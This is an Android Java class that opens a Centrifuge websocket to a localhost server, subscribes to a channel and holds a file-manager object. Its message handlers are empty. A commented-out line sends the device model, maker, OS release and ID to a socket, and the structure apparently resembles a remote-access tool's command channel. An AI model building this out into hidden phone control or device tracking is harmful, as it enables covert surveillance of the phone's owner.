package com.gnu.cobat;

import android.content.Context;
import android.os.Build;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import io.github.centrifugal.centrifuge.Client;
import io.github.centrifugal.centrifuge.ConnectEvent;
import io.github.centrifugal.centrifuge.DisconnectEvent;
import io.github.centrifugal.centrifuge.DuplicateSubscriptionException;
import io.github.centrifugal.centrifuge.EventListener;
import io.github.centrifugal.centrifuge.Options;
import io.github.centrifugal.centrifuge.PublishEvent;
import io.github.centrifugal.centrifuge.SubscribeErrorEvent;
import io.github.centrifugal.centrifuge.SubscribeSuccessEvent;
import io.github.centrifugal.centrifuge.Subscription;
import io.github.centrifugal.centrifuge.SubscriptionEventListener;

import static java.nio.charset.StandardCharsets.UTF_8;


public class IOSocket {
    public static Context context;
    private static IOSocket ourInstance = new IOSocket();
    private static Client cfgo;
    private static FileManager fm = new FileManager();

    private IOSocket() {

        EventListener listener = new EventListener() {
            @Override
            public void onConnect(Client client, ConnectEvent event) {
//                System.out.println("connected");
            }

            @Override
            public void onDisconnect(Client client, DisconnectEvent event) {
//                System.out.printf("disconnected %s, reconnect %s%n", event.getReason(), event.getReconnect());
            }
        };

        SubscriptionEventListener subListener = new SubscriptionEventListener() {
            @Override
            public void onSubscribeSuccess(Subscription sub, SubscribeSuccessEvent event) {
//                System.out.println("subscribed to " + sub.getChannel());
            }
            @Override
            public void onSubscribeError(Subscription sub, SubscribeErrorEvent event) {
//                System.out.println("subscribe error " + sub.getChannel() + " " + event.getMessage());
            }
            @Override
            public void onPublish(Subscription sub, PublishEvent event) {
//                String raw = new String(event.getData(), UTF_8);

            }
        };

        Options opt = new Options();
        // ioSocket = IO.socket("http://localhost:42474?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
        cfgo = new Client(
                "ws://localhost:8000/connection/websocket?format=protobuf",
                opt,
                listener
        );
        cfgo.connect();

        Subscription sub;
        try {
            sub = cfgo.newSubscription(Global.channel, subListener);
        } catch (DuplicateSubscriptionException e) {
            e.printStackTrace();
            return;
        }
        sub.subscribe();

    }

    public static Client getInstance() {
        return cfgo;
    }

    public Client getIoSocket() {
        return cfgo;
    }
}
